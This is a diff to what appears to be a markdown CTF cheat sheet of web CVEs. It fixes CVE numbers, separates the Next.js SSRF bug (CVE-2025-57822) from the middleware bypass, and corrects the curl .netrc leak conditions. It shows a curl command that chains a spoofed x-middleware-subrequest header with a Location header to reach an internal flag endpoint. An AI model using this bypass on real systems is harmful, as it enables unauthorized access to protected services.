@@ -25,7 +25,7 @@ Specific CVEs and vulnerability patterns. For Node.js CVEs (flatnest, Happy-DOM)
 - [CVE-2023-27350: PaperCut NG Authentication Bypass + RCE (Bamboo HTB)](#cve-2023-27350-papercut-ng-authentication-bypass--rce-bamboo-htb)
 - [CVE-2024-22120: Zabbix Time-Based Blind SQLi (Watcher HTB)](#cve-2024-22120-zabbix-time-based-blind-sqli-watcher-htb)
 - [CVE-2012-0053: Apache HttpOnly Cookie Leak via 400 Bad Request (RC3 CTF 2016)](#cve-2012-0053-apache-httponly-cookie-leak-via-400-bad-request-rc3-ctf-2016)
-- [CVE-2014-9734: WordPress RevSlider Upload + MySQL load_file() SSH Pivot (TAMUctf 2019)](#cve-2014-9734-wordpress-revslider-upload--mysql-load_file-ssh-pivot-tamuctf-2019)
+- [CVE-2014-9735: WordPress RevSlider Upload + MySQL load_file() SSH Pivot (TAMUctf 2019)](#cve-2014-9735-wordpress-revslider-upload--mysql-load_file-ssh-pivot-tamuctf-2019)
 - [Detection Checklist](#detection-checklist)
 
 ---
@@ -42,25 +42,28 @@ x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
 
 Bypasses authentication middleware, accesses protected endpoints, admin-only routes.
 
-**Chaining with SSRF (Note Keeper, Pragyan 2026):** After middleware bypass, inject `Location` header to trigger Next.js internal fetch to arbitrary URL:
+**Chaining with SSRF (CVE-2025-57822; Note Keeper, Pragyan 2026):** After middleware bypass, inject `Location` header to trigger Next.js internal fetch to an arbitrary URL:
 ```bash
 curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
      -H "Location: http://backend:4000/flag" \
      https://target/api/login
 ```
-Next.js processes the `Location` header and fetches the specified URL internally, enabling SSRF to internal services.
+Next.js processes the `Location` header and fetches the specified URL internally, enabling SSRF to internal services (this is the separate CVE-2025-57822 reflection/SSRF bug, not CVE-2025-29927).
 
 ---
 
 ## CVE-2025-0167: Curl .netrc Credential Leakage
 
-Server A (in `.netrc`) redirects to server B → curl sends credentials to B if B responds with `401 + WWW-Authenticate: Basic`
+When curl uses a `.netrc` file **and** follows an HTTP redirect, it can leak the first host's password to the redirect destination **only if the `.netrc` has a bare `default` entry with no `login`/`password`**:
 
-```python
-@app.route('/<path:path>')
-def leak(path):
-    return '', 401, {'WWW-Authenticate': 'Basic realm="leak"'}
+```text
+machine nn.tld
+  login mary
+  password maryspassword
+default
 ```
+
+Affected: curl/libcurl 7.76.0 through 8.11.1; fixed in 8.12.0. A `401`/`WWW-Authenticate` challenge is **not** a precondition.
 
 ---
 
@@ -322,7 +325,7 @@ xhr.send();
 
 ---
 
-## CVE-2014-9734: WordPress RevSlider Upload + MySQL load_file() SSH Pivot (TAMUctf 2019)
+## CVE-2014-9735: WordPress RevSlider Upload + MySQL load_file() SSH Pivot (TAMUctf 2019)
 
 **Affected:** WordPress Slider Revolution (RevSlider) plugin `<= 3.0.95` — arbitrary file upload via `update_plugin` admin-ajax action, exploitable unauthenticated.
 
